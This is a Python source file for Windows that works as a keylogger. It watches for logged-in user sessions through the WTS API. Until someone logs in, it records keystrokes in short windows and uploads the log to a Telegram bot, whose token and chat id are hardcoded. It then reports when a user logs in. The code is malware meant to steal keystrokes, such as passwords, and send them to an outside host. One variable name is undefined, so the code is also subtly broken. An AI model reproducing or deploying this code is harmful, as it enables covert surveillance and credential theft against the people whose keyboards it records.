#lang:python
#requirements: requests pynput

import requests
import subprocess
import os
import tempfile
import string
import time
import sys
import ctypes
import ctypes.wintypes
from pynput.keyboard import Key, Listener
import logging
import threading

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def is_user_logged_in():
    WTS_CURRENT_SERVER_HANDLE = 0
    WTS_CURRENT_SESSION = -1

    WTSUserName = 5
    WTSDomainName = 7

    WTSActive = 0

    class WTS_SESSION_INFO(ctypes.Structure):
        _fields_ = [
            ('SessionId', ctypes.wintypes.DWORD),
            ('pWinStationName', ctypes.wintypes.LPWSTR),
            ('State', ctypes.wintypes.DWORD)
        ]

    WTS_SESSION_INFOPtr = ctypes.POINTER(WTS_SESSION_INFO)

    wtsapi32 = ctypes.windll.wtsapi32

    WTSEnumerateSessions = wtsapi32.WTSEnumerateSessionsW
    WTSEnumerateSessions.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(WTS_SESSION_INFOPtr), ctypes.POINTER(ctypes.wintypes.DWORD)]
    WTSEnumerateSessions.restype = ctypes.wintypes.BOOL

    WTSFreeMemory = wtsapi32.WTSFreeMemory

    WTSQuerySessionInformation = wtsapi32.WTSQuerySessionInformationW
    WTSQuerySessionInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.LPWSTR), ctypes.POINTER(ctypes.wintypes.DWORD)]
    WTSQuerySessionInformation.restype = ctypes.wintypes.BOOL

    sessions = WTS_SESSION_INFOPtr()
    count = ctypes.wintypes.DWORD()

    if WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, ctypes.byref(sessions), ctypes.byref(count)):
        for i in range(count.value):
            session = sessions[i]
            if session.State == WTSActive:
                user_name = ctypes.wintypes.LPWSTR()
                domain_name = ctypes.wintypes.LPWSTR()
                user_name_len = ctypes.wintypes.DWORD()
                domain_name_len = ctypes.wintypes.DWORD()

                if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSUserName, ctypes.byref(user_name), ctypes.byref(user_name_len)):
                    if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSDomainName, ctypes.byref(domain_name), ctypes.byref(domain_name_len)):
                        if user_name.value and domain_name.value:
                            WTSFreeMemory(user_name)
                            WTSFreeMemory(domain_name)
                            WTSFreeMemory(sessions)
                            return True
                WTSFreeMemory(user_name)
                WTSFreeMemory(domain_name)

        WTSFreeMemory(sessions)
        
    return False

def keylogger(file, timeout):
    logging.basicConfig(filename=file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    stop_listener = threading.Event()

    def on_press(key):
        logging.info(str(key))

    def stop_after_delay():
        stop_listener.wait(timeout)
        stop_listener.set()
        listener.stop()

    timer_thread = threading.Thread(target=stop_after_delay)
    timer_thread.start()

    with Listener(on_press=on_press) as listener:
        stop_listener.wait()
        listener.stop()

    timer_thread.join()

def is_file_empty(file_path):
    return os.path.getsize(file_path) == 0

temp_file = tempfile.NamedTemporaryFile(delete=False)
log_file_path = temp_file.name
temp_file.close()
print(log_file_path)

while True:
    if is_user_logged_in():
        if os.path.isfile(log_file_path):
            os.remove(log_file_path)
        send_message(chat_id, token, "userlogged")
        break
    else:
        keylogger(log_file_path, 10)
        if not is_file_empty(file_path):
            send_file(chat_id, token, log_file_path)